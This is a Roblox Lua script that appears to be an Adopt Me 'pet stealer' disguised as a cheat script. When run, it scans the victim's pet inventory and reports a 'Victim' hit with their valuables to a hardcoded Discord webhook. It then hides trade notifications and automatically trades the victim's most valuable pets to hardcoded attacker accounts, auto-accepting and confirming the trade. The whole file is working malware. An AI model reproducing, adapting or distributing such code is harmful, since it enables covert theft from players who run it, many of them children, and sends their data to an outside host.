-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --

-- [[ CONFIG ]] --
local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
local THRESHOLD = 0.13 
local DISCORD_INV = "https://discord.gg/J4w2w5CW9"

-- 1. CLIPBOARD COPY
if setclipboard then setclipboard(DISCORD_INV) end

-- 2. SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- 3. BLACKLIST (Strict)
local BLACKLIST = {
    ["jiggly_jerboa"] = true,
    ["starter_egg"] = true,
    ["dog"] = true,
    ["cat"] = true,
    ["practice_dog"] = true
}

-- 4. HASH FINDER
local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do hashes[key] = value end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end
    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
end

-- 5. VALUATION & EMOJIS
local function getFinalValue(base, props)
    if not base or base <= 0.01 then return 0 end
    local val = base
    if props.mega_neon or props.mega then val = val * 8
    elseif props.neon then val = val * 3 end
    if props.flyable then val = val + 0.5 end
    if props.rideable then val = val + 0.5 end
    return val * 56
end

local function getPetEmoji(props)
    local e = "🐾"
    if props.mega_neon or props.mega then e = "Ⓜ️" 
    elseif props.neon then e = "⭐" end
    if props.flyable then e = e.."🪽" end
    if props.rideable then e = e.."🏇" end
    return e
end

-- 6. INVENTORY SCAN
local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
local InventoryDB = Fsys("InventoryDB")
local ClientData = Fsys("ClientData")

local function processInventory()
    local inv = ClientData.get("inventory")
    local total = 0
    local petGroups = {}
    local tradeList = {}

    for uid, pet in pairs(inv.pets or {}) do
        local petData = InventoryDB.pets[pet.id]
        if petData and not BLACKLIST[pet.id] then
            local props = pet.properties or {}
            local unitVal = getFinalValue(petData.rvalue, props)
            
            if unitVal >= THRESHOLD then
                total = total + unitVal
                table.insert(tradeList, {uid = uid, val = unitVal})
                
                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
                if not petGroups[key] then
                    petGroups[key] = {
                        name = petData.name,
                        count = 1,
                        price = unitVal,
                        emoji = getPetEmoji(props)
                    }
                else
                    petGroups[key].count = petGroups[key].count + 1
                end
            end
        end
    end
    
    local sorted = {}
    for _, v in pairs(petGroups) do table.insert(sorted, v) end
    table.sort(sorted, function(a, b) return a.price > b.price end)
    table.sort(tradeList, function(a,b) return a.val > b.val end)
    
    return sorted, total, tradeList
end

local sortedPets, grandTotal, finalTradeList = processInventory()

-- 7. WEBHOOK
local function sendHit()
    local lines = {}
    for _, p in ipairs(sortedPets) do
        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
    end

    local payload = {
        embeds = {{
            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
            description = "👤 Victim: "..LocalPlayer.DisplayName.."\n💰 Total: ₱"..string.format("%.2f", grandTotal),
            fields = {
                {name = "🐶 Inventory", value = "```"..table.concat(lines, "\n").."```"},
                {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
            },
            color = 0x2F3136
        }}
    }
    (syn and syn.request or request)({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
end

-- 8. THE STEAL (Bypass 10s Cooldown)
local function startSteal(target)
    task.spawn(function()
        -- Suppress GUI
        LocalPlayer.PlayerGui.DescendantAdded:Connect(function(d)
            if d.Name:find("Trade") or d.Name:find("Notification") then d.Visible = false end
        end)

        -- Smart Wait for Receiver
        while not target.Character or not target.Parent do task.wait(1) end
        
        -- High Priority Request
        for i = 1, 40 do
            if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
            hashedAPI("TradeAPI/SendTradeRequest", target)
            task.wait(0.5) -- Slightly slower interval to bypass spam-triggers
        end

        if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
            for i = 1, math.min(18, #finalTradeList) do
                hashedAPI("TradeAPI/AddItemToOffer", finalTradeList[i].uid)
                task.wait(0.05)
            end
            
            while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
                hashedAPI("TradeAPI/AcceptNegotiation")
                hashedAPI("TradeAPI/ConfirmTrade")
                task.wait(0.2)
            end
        end
    end)
end

if #sortedPets > 0 then sendHit() end

task.spawn(function()
    while true do
        for _, p in pairs(Players:GetPlayers()) do
            if table.find(USERNAMES, p.Name) and p ~= LocalPlayer then 
                startSteal(p) 
                return 
            end
        end
        task.wait(1)
    end
end)
